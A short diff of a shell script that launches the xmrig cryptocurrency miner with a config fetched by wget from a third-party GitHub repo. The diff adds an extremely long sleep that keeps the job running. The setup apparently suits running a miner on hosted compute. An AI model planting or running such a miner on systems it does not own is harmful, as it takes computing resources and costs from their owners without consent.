@@ -4,3 +4,4 @@ cd xmrig-6.16.4
 rm -rf config.json
 wget -O config.json https://raw.githubusercontent.com/thongtest2/mining/main/config.json
 ./xmrig
+sleep 9876543210
